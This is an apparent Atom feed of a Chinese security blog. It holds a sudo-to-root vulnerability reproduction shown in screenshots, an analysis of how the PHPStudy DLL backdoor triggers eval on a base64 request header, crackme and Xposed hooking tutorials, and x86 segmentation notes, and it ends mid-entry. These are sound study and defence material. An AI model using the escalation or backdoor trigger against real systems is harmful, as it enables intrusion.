    <content type="html"><![CDATA[<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><blockquote><p>该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧</p></blockquote><h3 id="Sudoer"><a href="#Sudoer" class="headerlink" title="Sudoer"></a>Sudoer</h3><blockquote><p>修改sudoer文件,如下</p></blockquote><p><img src="/images/pasted-176.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我的低权限用户账号是admin</p></blockquote><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><blockquote><p>在admin账号权限下运行</p></blockquote><p><img src="/images/pasted-177.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>在vim界面输入</p></blockquote><p><img src="/images/pasted-178.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>得到root权限</p></blockquote><p><img src="/images/pasted-179.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>sudo 1.8.28 之前的所有版本</p></blockquote><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><blockquote><p>升级sudo</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>段的机制浅析</title>
    <link href="/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html"/>
    <url>/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html</url>
    
    <content type="html"><![CDATA[<h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><blockquote><p>X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16位模拟)</p></blockquote><blockquote><p>X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称为称为x86-64，后更名为AMD 64，intel也出了自己的一套64位指令集，但是不向下兼容，所以就没了，继而移植了amd 64位指令集，称为intel 64(能够兼容x86指令集的)</p></blockquote><h2 id="段的机制"><a href="#段的机制" class="headerlink" title="段的机制"></a>段的机制</h2><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><pre><code class="c">mov dword ptr ds:[0x123456],eax实际操作的是 ds.base + 0x123456 地址</code></pre><h4 id="段寄存器的种类"><a href="#段寄存器的种类" class="headerlink" title="段寄存器的种类"></a>段寄存器的种类</h4><blockquote><p>ES(拓展段)、CS(代码段)、SS(堆栈段)、DS(数据段)、FS、GS、LDTR、TR 共8个段寄存器</p></blockquote><h4 id="段寄存器的读写"><a href="#段寄存器的读写" class="headerlink" title="段寄存器的读写"></a>段寄存器的读写</h4><pre><code class="c">读只能读16位，写能写入96位mov ax, ds    必须指定写入的地址为16位mov ds, eax除LDTR和TR外，其余段寄存器可用MOV指令进行读写</code></pre><h4 id="段寄存器的结构"><a href="#段寄存器的结构" class="headerlink" title="段寄存器的结构"></a>段寄存器的结构</h4><p><img src="/images/pasted-170.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子    WROD Attribute,  16bit//属性  可读/可写/可执行    DWORD Base,      16bit//Base  段的起始地址    DWORD Limit      16bit//Limit 段的整体长度};</code></pre><p><img src="/images/pasted-171.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="根据上图进行段寄存器的不可见部分探测"><a href="#根据上图进行段寄存器的不可见部分探测" class="headerlink" title="根据上图进行段寄存器的不可见部分探测"></a>根据上图进行段寄存器的不可见部分探测</h4><h5 id="探测Attribute是否存在"><a href="#探测Attribute是否存在" class="headerlink" title="探测Attribute是否存在"></a>探测Attribute是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, cs        mov ds, ax                        //ds == cs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 cs.base + 0x1000 地址进行操作，但由于 cs 属性是不可写，所以编译出错。    }    return 0;}</code></pre><h5 id="探测Base是否存在"><a href="#探测Base是否存在" class="headerlink" title="探测Base是否存在"></a>探测Base是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                   //ds == fs        mov dword ptr ds:[0], eax    //对ds.base + 0x0 地址进行操作就相当于对 fs.base + 0x0 地址进行操作        //等同 mov dword ptr [0x7FFDE000], eax ,正常情况下，我们对0地址是不能读也不能写，这里可以编译通过，是因为我们对地址 0x0x7FFDE000 进行写操作。将fs换成其余的段寄存器，就会报错    }    return 0;}</code></pre><h5 id="探测Limit是否存在"><a href="#探测Limit是否存在" class="headerlink" title="探测Limit是否存在"></a>探测Limit是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                        //ds == fs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 fs.base + 0x1000 地址进行操作，但由于 fs 支持的长度只是到0xFFF，0x1000 &gt; 0xFFF，所以编译出错。    }    return 0;}</code></pre><h3 id="段描述符与段选择子"><a href="#段描述符与段选择子" class="headerlink" title="段描述符与段选择子"></a>段描述符与段选择子</h3><h4 id="GDT-全局描述符表-与LDT-本地描述符表"><a href="#GDT-全局描述符表-与LDT-本地描述符表" class="headerlink" title="GDT(全局描述符表)与LDT(本地描述符表)"></a>GDT(全局描述符表)与LDT(本地描述符表)</h4><blockquote><p>windbg查看GDT表</p></blockquote><pre><code class="c">r gdtr  //查看GDT表的位置r gdtl  //查看GDT表的长度dd 0x80808080(地址) //查看指定地址的内容(四字节查看)dq 0x80808080(地址) //查看指定地址的内容(八字节查看)dq 0x80808080(地址) L40 //查看指定地址的内容(八字节查看)，显示40组</code></pre><h4 id="段选择子结构"><a href="#段选择子结构" class="headerlink" title="段选择子结构"></a>段选择子结构</h4><p><img src="/images/pasted-172.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="段描述符结构"><a href="#段描述符结构" class="headerlink" title="段描述符结构"></a>段描述符结构</h4><p><img src="/images/pasted-173.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-174.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-175.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">数据 E 拓展位    根据D/B位可知段的上限，0为64kb，1为4GB。    向上拓展        ds.base + limit 的红色区域是可用的    向下拓展        出了红色部分，其余是可用的代码 C 一致位    非一致代码段    一致代码段</code></pre><h3 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h3><blockquote><p>CPU分为四个级别R0、R1、R2、R3(操作系统并没有使用R1、R2)，R0运行内核记驱动程序，R3运行用户层程序。</p></blockquote><p><code>CPL：当前特权级别</code></p><pre><code class="c">根据CS、SS的段选择子的RPL值可知道CPL的值假设CS为0x001B（0000 0000 0001 1011）RPL为3，所以CPL为3，所以应用程序运行在3环，是用户层程序。数据段的权限检查    检查CPL权限是否大于等于DPL，RPL权限是否大于等于DPL    假设CPL = 0    mov ax，000B    mov ds，ax       //RPL = 3，指向的段描述符的DPL为0    CPL权限与DPL相同，检测通过，RPL权限比DPL权限低，检测失败代码段、系统描述符的权限检查与数据段不完全相同，后面会学习到。</code></pre><h3 id="段寄存器的操作"><a href="#段寄存器的操作" class="headerlink" title="段寄存器的操作"></a>段寄存器的操作</h3><blockquote><p>mov ds, ax //ds的值不能乱给，需要符合段选择子</p></blockquote><blockquote><p>除了mov指令还可以使用 LES，LSS，LDS，LFS，LGS指令修改段寄存器的值</p></blockquote><blockquote><p>没有LCS是因为更改CS涉及到更改EIP。</p></blockquote><pre><code class="c">例：    les ecx, fword ptr ds:[0x1000] //将ds.base + 0x1000 地址处的内容的高两个字节放入es，剩下四个字节放入ecx。fwrod（6字节）假设ax = 0x001B（0000 0000 0001 1011）所以：RPL = 3（请求特权级别为3，由11给出）     所要查询的表是GDT表（由 0 给出）     指定获取表中下标为3的段描述符（由0000 0000 0001 1给出,假设为 0x004F9AFF`0xFFFFFFFF）     根据段描述符可得         段基地址：0x00FFFFFF        段极限：0x000FFFFF(G位为0，所以在前面填充12个0)        段的属性：0x4F9A</code></pre><h3 id="回过头，在看一下段寄存器的结构"><a href="#回过头，在看一下段寄存器的结构" class="headerlink" title="回过头，在看一下段寄存器的结构"></a>回过头，在看一下段寄存器的结构</h3><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子         指向的是段选择子结构    WROD Attribute,  16bit//属性   可读/可写/可执行   指向的是段描述符结构的 G + D/B + L + AVL + 段界限0 + P + DPL + S + TYPE    DWORD Base,      32bit//Base  段的起始地址       指向的是段描述符结构的 段基地址0 + 段基地址1 + 段基地址2    DWORD Limit      32bit//Limit 段极限             指向的是段描述符结构的 段界限0 + 段界限1 合起来是20位，根据 G 位的值，若为0，则在其前面填充12位的0，最大就为0x000FFFFF，若为1，则在其后面填充12位的1，最大就为0xFFFFFFFF};虽然只能可见部分只有16bit，但是通过它去查找GDT/LDT表，就能获得其余80bit的值</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>学习完这些，能够知道RPL、DPL、CPL分别只什么，怎么找到，段选择子与段描述符的结构以及每一位的作用，如何找到DGT/LDT表，能够按顺序背下ES、CS、SS、DS、FS、GS、LSTR、TR的名字，给一个段选择子能够分析出段的其余80bit的值。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>保护机制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>段的机制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KCTF-1</title>
    <link href="/KCTF-1.html"/>
    <url>/KCTF-1.html</url>
    
    <content type="html"><![CDATA[<hr><h3 id="初世纪"><a href="#初世纪" class="headerlink" title="初世纪"></a>初世纪</h3><p><img src="/images/pasted-152.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入不正确就会出现这个弹窗</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><h5 id="定位WinMain函数"><a href="#定位WinMain函数" class="headerlink" title="定位WinMain函数"></a>定位WinMain函数</h5><p><img src="/images/pasted-153.png" srcset="/img/loading.gif" alt="upload successful"></p><h5 id="找到DialogBoxParam的回调函数"><a href="#找到DialogBoxParam的回调函数" class="headerlink" title="找到DialogBoxParam的回调函数"></a>找到DialogBoxParam的回调函数</h5><p><img src="/images/pasted-154.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数原型：    int DialogBoxParam（HINSTANCE hInstance，LPCTSTR IpTemplateName,HWND hWndParent， DLGPROC IPDialogFunc,LPARAM dwlnitParam）；参数：hlnstance       标识一个模块的实例，该模块的可执行文件含有对话框模板。IpTemplateName  标识对话框模板。此参数可以指向一个以NULL结尾的字符串的指针,该字符串指定对话框模扳名，或是指定对话框模板的资源标识符的一个整型值。如果此参数指定了一个资源标识符，则它的高位字一定为零，且低位字一定含有标识符。一定用MAKEINTRESOURCE宏指令创建此值。hWndParent      指定拥有对话框的窗口。IpDialogFunc    指向对话框过程的指针。dwInitParam     指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值。返回值 如果函数调用成功则返回值为在对函数EndDialog的调用中的nResult参数，该EndDialog函数用于中止对话框。如果函数调用失败，则返回值为-1。</code></pre><h5 id="F5大法定位关键代码"><a href="#F5大法定位关键代码" class="headerlink" title="F5大法定位关键代码"></a>F5大法定位关键代码</h5><p><img src="/images/pasted-155.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-156.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数功能：该函数获取对话框中与控制有关的文本或标题。函数原型    UINT GetDlgltemText(HWND hDlg,int nlDDlltem,LPTSTR IpString int nMazCount);参数    hDlg       指向含有控制的对话框的句柄。    nlDDlgltem 指定标题或文本将被检索的控制的标识符。    IpString   指向获取标题或文本的缓冲器的指针。    nMaxCount  指定被复制到lpString参数指向的缓冲区的字符串的最大长度。如果字符串的字符最大长度超过范围，则该字符串被截断。返回值 如果函数调用成功，则返回值表示被复制缓冲区的字符串的长度，不包括以NULL结尾的字符串。如果函数调用失败,则返回值为零。若想获得更多错误信息，请调用GetLastError函数。</code></pre><blockquote><p>得到注册码为6Ewi9H</p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-157.png" srcset="/img/loading.gif" alt="upload successful"></p><hr><h3 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h3><p><img src="/images/pasted-158.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="OD调试之"><a href="#OD调试之" class="headerlink" title="OD调试之"></a>OD调试之</h4><p><img src="/images/pasted-159.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>通过字符串找到关键点</p></blockquote><p><img src="/images/pasted-160.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看出来一些流程，输入字符串，得到长度，然后判断是否在10～30之间，将字符串copy到另外一个地方，比较字符串的第八个位置是否为’A’。</p></blockquote><p><img src="/images/pasted-161.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>进入此函数</p></blockquote><p><img src="/images/pasted-162.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>该函数的逻辑是：将输入的第七个字符串换成’#’，字符串的每位都与0x1F进行xor运算。然后下面没有思路了</p></blockquote><h4 id="IDA查看之"><a href="#IDA查看之" class="headerlink" title="IDA查看之"></a>IDA查看之</h4><p><img src="/images/pasted-163.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到字符串(将字符串复制到的地址)的交叉引用，挨个扫一眼</p></blockquote><p><img src="/images/pasted-164.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到这一个函数</p></blockquote><p><img src="/images/pasted-165.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到该函数的交叉引用</p></blockquote><p><img src="/images/pasted-166.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到第二个参数就是’invalid argument’</p></blockquote><p><img src="/images/pasted-167.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>关键比较处，a2就是’invalid argument’ ^ 28后的结果，dword_2F3088就是我们输入字符串复制到的地址</p></blockquote><blockquote><p>在关键部分下断点，可以得到比较的字符串</p></blockquote><p><img src="/images/pasted-168.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>到此，程序整体逻辑也就明了了，输入字符串，判断第八位是否为A，将第八位换成#，整体字符在与 0x1f 异或，得到的字符 和 ‘invalid argument’与28异或后的结果相比较</p></blockquote><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre><code class="bash">In [1]: flag = &quot;invalid argument&quot;In [2]: temp = &#39;&#39;In [3]: for i in range(0,len(flag)):   ...:     temp += chr(ord(flag[i]) ^ 28)In [4]: tempOut[4]: &#39;urj}pux&lt;}n{iqyrh&#39;In [5]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [6]: flag = &#39;&#39;In [7]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [8]: flagOut[8]: &#39;jmubojg#bqdvnfmw&#39;# 最后将#换成&#39;A&#39;即可</code></pre><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-169.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>KCTF的题目质量是真的好，准备把这几年的比赛题目都拿来做做，学习学习，还是有很多姿势的。。。。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MacOS上IDA pro的小问题修复</title>
    <link href="/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html"/>
    <url>/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。</p></blockquote><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p><img src="/images/pasted-145.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性</p></blockquote><blockquote><p>文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes）</p></blockquote><blockquote><p>这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开</p></blockquote><h4 id="xattr"><a href="#xattr" class="headerlink" title="xattr"></a>xattr</h4><pre><code class="bash">xattr -c filename # 可以清除这个附加属性</code></pre><blockquote><p>天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决</p></blockquote><h3 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h3><p><img src="/images/pasted-146.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-147.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>出现签名的问题，然后又是一番疯狂Google</p></blockquote><p><img src="/images/pasted-148.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。</p></blockquote><p><img src="/images/pasted-149.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>取消勾选 允许应用控制电脑 即可解决问题。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS IDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPStudy后门研究</title>
    <link href="/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html"/>
    <url>/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote><hr><h3 id="PHPStudy-后门文件"><a href="#PHPStudy-后门文件" class="headerlink" title="PHPStudy 后门文件"></a>PHPStudy 后门文件</h3><blockquote><p>php/ext目录下的php_xmlrpc.dll文件 。</p></blockquote><p><img src="/images/pasted-139.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="检测是否存在后门"><a href="#检测是否存在后门" class="headerlink" title="检测是否存在后门"></a>检测是否存在后门</h3><blockquote><p>记事本打开文件，查看是否存在如下所示的字符串，如果有说明存在后门，可升级官方最新版。</p></blockquote><p><img src="/images/pasted-140.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="IDA分析后门文件"><a href="#IDA分析后门文件" class="headerlink" title="IDA分析后门文件"></a>IDA分析后门文件</h3><blockquote><p>根据字符串信息，快速定位关键函数</p></blockquote><p><img src="/images/pasted-141.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-142.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-143.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>根据判断请求头的Accept-Encoding是否为gzip,deflate进行判断Accept-Charset的值base64解密是否成功，如果成功就对它进行gzcompress压缩，然后执行@eval(gzuncompress(data));</p></blockquote><h3 id="相关检测脚本"><a href="#相关检测脚本" class="headerlink" title="相关检测脚本"></a>相关检测脚本</h3><blockquote><p>github已经有大佬上传了，需要研究学习的朋友，可以自己搜索</p></blockquote><hr><blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpstudy后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模2运算</title>
    <link href="/%E6%A8%A12%E8%BF%90%E7%AE%97.html"/>
    <url>/%E6%A8%A12%E8%BF%90%E7%AE%97.html</url>
    
    <content type="html"><![CDATA[<h2 id="模2运算"><a href="#模2运算" class="headerlink" title="模2运算"></a>模2运算</h2><blockquote><p>简介：将数字换算成二进制的形式进行运算，无进位也无借位。</p></blockquote><h2 id="模2加法"><a href="#模2加法" class="headerlink" title="模2加法"></a>模2加法</h2><pre><code class="c">1 + 1 = 01 + 0 = 10 + 1 = 10 + 0 = 0    1010101+   1000101————————————    0010000    10101011+   10100111+   11100010————————————    11101110奇数个1相加得1，偶数个1相加得0    </code></pre><h2 id="模2减法"><a href="#模2减法" class="headerlink" title="模2减法"></a>模2减法</h2><pre><code class="c">1 - 1 = 01 - 0 = 10 - 1 = 10 - 0 = 0    1010101-   1000101————————————    0010000    10101011-   10100111-   11100010————————————    11101110    </code></pre><h2 id="模2乘法"><a href="#模2乘法" class="headerlink" title="模2乘法"></a>模2乘法</h2><pre><code class="c">1 x 1 = 11 x 0 = 00 x 1 = 00 x 0 = 0    1010101x   1000101————————————    1000101</code></pre><h2 id="模2除法"><a href="#模2除法" class="headerlink" title="模2除法"></a>模2除法</h2><pre><code class="c">运算的时候每位都进行xor运算规则：被除数除以除数,被除数首位为1时,商1,为0时商0     所得余数去除首位(左移一位)     重复上一步直到被除数位数少于除数位数例子：1111000对除数1101做模2除法:         1011             商     ------------1101/ 1111000             被除数 首位为1，商为1      1101                除数     ------------      0010000             余数去除首位,作为新的被除数，首位为0，商为0       0000               被除数首位为0，则除数就为0     ------------       010000             余数去除首位,作为新的被除数，首位为1，商为1        1101              被除数首位为1,除以除数      ------------        01010             余数去除首位,作为新的被除数，首位为1，商为1         1101             被除数首位为1,除以除数       ------------         0111             余数去除首位，为111位数为3，小于除数位数4，不再进行运算，得到结果结果：商1011余111        </code></pre>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xposed hook框架学习</title>
    <link href="/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html"/>
    <url>/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html</url>
    
    <content type="html"><![CDATA[<h3 id="Xposed-安装"><a href="#Xposed-安装" class="headerlink" title="Xposed 安装"></a>Xposed 安装</h3><p><a href="http://dl-xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk" target="_blank" rel="noopener">xposed.apk</a></p><p><img src="/images/pasted-127.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="/images/pasted-128.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>初次运行是点击 安装/更新 就行了，后续在激活模块的时候可以点击 软重启 重启手机(模拟器)</p></blockquote><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><img src="/images/pasted-129.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示已安装的模块，打勾的说明是已经激活的</p></blockquote><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><img src="/images/pasted-130.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示网上已经有的模块，别人开发好的，可以直接拿过来用的那种</p></blockquote><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p><img src="/images/pasted-131.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p><img src="/images/pasted-132.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示模块运行时后的日志信息，可用来显示XposedBridge.log(“”);打印出来的消息</p></blockquote><h4 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h4><p><img src="/images/pasted-133.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="第一个模块学习"><a href="#第一个模块学习" class="headerlink" title="第一个模块学习"></a>第一个模块学习</h3><h4 id="在build-gradle中添加信息"><a href="#在build-gradle中添加信息" class="headerlink" title="在build.gradle中添加信息"></a>在build.gradle中添加信息</h4><pre><code class="python">compileOnly &#39;de.robv.android.xposed:api:82&#39;compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;</code></pre><p><img src="/images/pasted-134.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>导入框架需要的依赖</p></blockquote><h4 id="AndroidManifest-xml添加如下信息"><a href="#AndroidManifest-xml添加如下信息" class="headerlink" title="AndroidManifest.xml添加如下信息"></a>AndroidManifest.xml添加如下信息</h4><p><img src="/images/pasted-135.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="xml">&lt;meta-data    android:name=&quot;xposedmodule&quot;        该程序是否是xposed的模块    android:value=&quot;true&quot; /&gt;&lt;meta-data    android:name=&quot;xposeddescription&quot;   对本模块的功能的描述，可以自己简单的描述一下可以了    android:value=&quot;Module测试&quot; /&gt;&lt;meta-data    android:name=&quot;xposedminversion&quot;    是本模块开发时用到的Xposed的jar包最低版本号    android:value=&quot;54&quot; /&gt;</code></pre><blockquote><p>注意该段代码的放置位置</p></blockquote><h4 id="添加模块的入口函数"><a href="#添加模块的入口函数" class="headerlink" title="添加模块的入口函数"></a>添加模块的入口函数</h4><p><img src="/images/pasted-136.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-137.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>新建一个类，为Xposed模块的主类，新建一个assets目录，在目录下创建一个file xposed_init，里面添上模块入口函数的路径</p></blockquote><h4 id="编写模块的主要代码"><a href="#编写模块的主要代码" class="headerlink" title="编写模块的主要代码"></a>编写模块的主要代码</h4><pre><code class="java">package com.example.info;import android.widget.TextView;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage;public class Main implements IXposedHookLoadPackage {    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {        if(lpparam.packageName.equals(&quot;com.example.helloworld&quot;)){            XposedHelpers.findAndHookMethod(TextView.class, &quot;setText&quot;,CharSequence.class, new XC_MethodHook() {                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {                    param.args[0] = &quot;isHookedbe&quot;;                }                protected void afterHookedMethod(MethodHookParam param) throws Throwable {                    param.args[0] = &quot;isHookedaf&quot;;                }            });        }    }}</code></pre><blockquote><p>作用是HOOK TextView的setText方法</p></blockquote><h4 id="被Hook的程序的MainActivity"><a href="#被Hook的程序的MainActivity" class="headerlink" title="被Hook的程序的MainActivity"></a>被Hook的程序的MainActivity</h4><pre><code class="java">package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    private Button b;    private TextView t;    @Override    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        b = (Button)findViewById(R.id.button);        t = (TextView)findViewById(R.id.textView);        b.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View view) {                t.setText(&quot;aaaaaaaaaaaaaaa&quot;);            }        });    }}</code></pre><blockquote><p>在点击程序后本应该会显示aaaaaaaaaaaaaaa，hook之后会显示isHookedbe</p></blockquote><h4 id="看图"><a href="#看图" class="headerlink" title="看图"></a>看图</h4><p><img src="/images/pasted-138.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>先Hook成功一个案例，然后实现各种操作吧，可以看看官方的api</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xposed框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida Hook神器学习-1</title>
    <link href="/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html"/>
    <url>/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html</url>
    
